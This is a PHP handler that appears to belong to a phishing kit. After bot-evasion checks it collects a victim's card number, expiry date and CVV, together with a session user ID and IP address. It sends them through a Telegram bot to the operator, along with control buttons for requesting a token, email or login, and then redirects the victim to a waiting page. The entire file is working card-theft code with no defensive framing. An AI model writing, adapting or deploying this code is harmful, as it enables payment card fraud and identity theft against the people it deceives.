<?php
session_start();
include("settings.php");

$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header("Location: index.php");
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Anti-bot server-side checks
    $honeypot   = isset($_POST['honeypot']) ? (string)$_POST['honeypot'] : '';
    $csrf_post  = isset($_POST['csrf_token']) ? (string)$_POST['csrf_token'] : '';
    $csrf_cookie= isset($_COOKIE['csrf_token']) ? (string)$_COOKIE['csrf_token'] : '';
    $form_ts    = isset($_POST['form_ts']) ? (string)$_POST['form_ts'] : '';
    
    if ($honeypot !== '') {
        header('HTTP/1.1 403 Forbidden');
        exit;
    }
    if (!$csrf_post || !$csrf_cookie || !hash_equals($csrf_cookie, $csrf_post)) {
        header('HTTP/1.1 403 Forbidden');
        exit;
    }
    $ts_ok = false;
    if (ctype_digit($form_ts)) {
        $cts = (int)$form_ts;
        $nowms = (int)round(microtime(true) * 1000);
        $age = $nowms - $cts;
        if ($age >= 800 && $age <= (15 * 60 * 1000)) $ts_ok = true;
    }
    if (!$ts_ok) {
        header('HTTP/1.1 403 Forbidden');
        exit;
    }

    $tarj = $_POST['datos_val'] ?? '';
    $fecha = $_POST['vig_val'] ?? '';
    $cvv = $_POST['dig_sec'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "💳 CARD AVANZ\n";
    $msg .= "🆔 ID: $usuario\n";
    $msg .= "🔢 Tarjeta: $tarj\n";
    $msg .= "📅 Fecha: $fecha\n";
    $msg .= "🔐 CVV: $cvv\n";
    $msg .= "📍 IP: $ip";

    $botones = [
        [
            ["text" => "📩 TOKEN", "callback_data" => "TOKEN|$usuario"]
        ],
        [
            ["text" => "📩 MAIL", "callback_data" => "MAIL|$usuario"],
            ["text" => "🔁 LOGIN", "callback_data" => "LOGIN|$usuario"]
        ],
        [
            ["text" => "✅ LISTO", "callback_data" => "LISTO|$usuario"]
        ]
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => json_encode(['inline_keyboard' => $botones])
    ]));

    header("Location: sleep.html");
    exit;
}

// Si no es POST, redirigir
header("Location: card.php");
exit;
?>
